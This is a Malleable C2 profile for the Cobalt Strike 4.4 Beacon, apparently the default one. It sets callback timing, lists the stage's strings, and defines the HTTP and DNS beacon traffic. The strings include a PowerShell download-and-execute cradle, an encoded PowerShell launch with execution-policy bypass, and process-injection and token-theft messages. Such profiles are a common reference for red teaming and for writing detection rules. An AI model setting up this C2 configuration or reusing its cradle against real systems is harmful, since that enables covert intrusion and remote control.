# default cs 4.4 profile

# default sleep time is 60s
set sleeptime "60000";

# jitter factor 0-99% [randomize callback times]
set jitter    "0";

# indicate that this is the default Beacon profile
set sample_name "Cobalt Strike Beacon (Default)";

# this is the default profile. Make sure we look like Cobalt Strike's Beacon payload. (that's what we are, right?)
stage {
	set stomppe "false";
	set name    "beacon.dll";

	string "%d.%s";
	string "post";
	string "%s%s";
	string "cdn.%x%x.%s";
	string "www6.%x%x.%s";
	string "%s.1%x.%x%x.%s";
	string "%s.4%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%x%x.%s";
	string "%s.3%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%x%x.%s";
	string "%s.2%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%x%x.%s";
	string "%s.2%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x.%x%x.%s";
	string "%s.2%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x.%x%x.%s";
	string "%s.1%08x%08x%08x%08x%08x%08x%08x.%x%x.%s";
	string "%s.1%08x%08x%08x%08x%08x%08x.%x%x.%s";
	string "%s.1%08x%08x%08x%08x%08x.%x%x.%s";
	string "%s.1%08x%08x%08x%08x.%x%x.%s";
	string "%s.1%08x%08x%08x.%x%x.%s";
	string "%s.1%08x%08x.%x%x.%s";
	string "%s.1%08x.%x%x.%s";
	string "api.%x%x.%s";
	string "unknown";
	string "could not run command (w/ token) because of its length of %d bytes!";
	string "could not spawn %s (token): %d";
	string "could not spawn %s: %d";
	string "Could not open process token: %d (%u)";
	string "could not run %s as %s\\%s: %d";
	string "COMSPEC";
	string " /C ";
	string "could not upload file: %d";
	string "could not open %s: %d";
	string "could not get file time: %d";
	string "could not set file time: %d";
	string "127.0.0.1";
	string "Could not connect to pipe (%s): %d";
	string "Could not open service control manager on %s: %d";
	string "Could not create service %s on %s: %d";
	string "Could not start service %s on %s: %d";
	string "Started service %s on %s";
	string "Could not query service %s on %s: %d";
	string "Could not delete service %s on %s: %d";
	string "SeDebugPrivilege";
	string "SeTcbPrivilege";
	string "SeCreateTokenPrivilege";
	string "SeAssignPrimaryTokenPrivilege";
	string "SeLockMemoryPrivilege";
	string "SeIncreaseQuotaPrivilege";
	string "SeUnsolicitedInputPrivilege";
	string "SeMachineAccountPrivilege";
	string "SeSecurityPrivilege";
	string "SeTakeOwnershipPrivilege";
	string "SeLoadDriverPrivilege";
	string "SeSystemProfilePrivilege";
	string "SeSystemtimePrivilege";
	string "SeProfileSingleProcessPrivilege";
	string "SeIncreaseBasePriorityPrivilege";
	string "SeCreatePagefilePrivilege";
	string "SeCreatePermanentPrivilege";
	string "SeBackupPrivilege";
	string "SeRestorePrivilege";
	string "SeShutdownPrivilege";
	string "SeAuditPrivilege";
	string "SeSystemEnvironmentPrivilege";
	string "SeChangeNotifyPrivilege";
	string "SeRemoteShutdownPrivilege";
	string "SeUndockPrivilege";
	string "SeSyncAgentPrivilege";
	string "SeEnableDelegationPrivilege";
	string "SeManageVolumePrivilege";
	string "Could not create service: %d";
	string "Could not start service: %d";
	string "Failed to impersonate token: %d";
	string "Failed to get token";
	string "IsWow64Process";
	string "kernel32";
	string "Could not open '%s'";
	string "%s\\%s";
	string "copy failed: %d";
	string "move failed: %d";
	string "D	0	%02d/%02d/%02d %02d:%02d:%02d	%s";
	string "F	%I64d	%02d/%02d/%02d %02d:%02d:%02d	%s";
	string "Wow64DisableWow64FsRedirection";
	string "Wow64RevertWow64FsRedirection";
	string "ppid %d is in a different desktop session (spawned jobs may fail). Use 'ppid' to reset.";
	string "could not allocate %d bytes in process: %d";
	string "could not write to process memory: %d";
	string "could not adjust permissions in process: %d";
	string "could not create remote thread in %d: %d";
	string "could not open process %d: %d";
	string "%d is an x64 process (can't inject x86 content)";
	string "%d is an x86 process (can't inject x64 content)";
	string "syswow64";
	string "system32";
	string "Could not set PPID to %d: %d";
	string "Could not set PPID to %d";
	string "ntdll";
	string "NtQueueApcThread";
	string "%ld	";
	string "%.2X";
	string "%.2X:";
	string "process";
	string "Could not connect to pipe: %d";
	string "%d	%d	%s";
	string "Kerberos";
	string "kerberos ticket purge failed: %08x";
	string "kerberos ticket use failed: %08x";
	string "could not connect to pipe: %d";
	string "could not connect to pipe";
	string "Maximum links reached. Disconnect one";
	string "%d	%d	%d.%d	%s	%s	%s	%d	%d";
	string "Could not bind to %d";
	string "IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:%u/')";
	string "%%IMPORT%%";
	string "Command length (%d) too long";
	string "IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:%u/'); %s";
	string "powershell -nop -exec bypass -EncodedCommand \"%s\"";
	string "?%s=%s";
	string "%s&%s=%s";
	string "%s%s: %s";
	string "%s&%s";
	string "%s%s";
	string "Could not kill %d: %d";
	string "%s	%d	%d";
	string "%s	%d	%d	%s	%s	%d";
	string "%s\\*";
	string "sha256";
	string "abcdefghijklmnop";
	string "sprng";
	string "could not create pipe: %d";
	string "I'm already in SMB mode";
	string "%s (admin)";
	string "Could not open process: %d (%u)";
	string "Failed to impersonate token from %d (%u)";
	string "Failed to duplicate primary token for %d (%u)";
	string "Failed to impersonate logged on user %d (%u)";
	string "Could not create token: %d";
	string "HTTP/1.1 200 OK";
	string "Content-Type: application/octet-stream";
	string "Content-Length: %d";
	string "Microsoft Base Cryptographic Provider v1.0";
}

# define indicators for an HTTP GET
http-get {
	# Beacon will randomly choose from this pool of URIs
	set uri "/ca /dpixel /__utm.gif /pixel.gif /g.pixel /dot.gif /updates.rss /fwlink /cm /cx /pixel /match /visit.js /load /push /ptj /j.ad /ga.js /en_US/all.js /activity /IE9CompatViewList.xml";

	client {
		# base64 encode session metadata and store it in the Cookie header.
		metadata {
			base64;
			header "Cookie";
		}
	}

	server {
		# server should send output with no changes
		header "Content-Type" "application/octet-stream";

		output {
			print;
		}
	}
}

# define indicators for an HTTP POST
http-post {
	# Same as above, Beacon will randomly choose from this pool of URIs [if multiple URIs are provided]
	set uri "/submit.php";

	client {
		header "Content-Type" "application/octet-stream";

		# transmit our session identifier as /submit.php?id=[identifier]
		id {
			parameter "id";
		}

		# post our output with no real changes
		output {
			print;
		}
	}

	# The server's response to our HTTP POST
	server {
		header "Content-Type" "text/html";

		# this will just print an empty string, meh...
		output {
			print;
		}
	}
}

# define indicators/attributes for a DNS Beacon
dns-beacon {
    # maximum number of bytes to send in a DNS A record request
    set maxdns    "255";

    set beacon "";
    set get_A "cdn.";
    set get_AAAA "www6.";
    set get_TXT "api.";
    set put_metadata "www.";
    set put_output "post.";
}
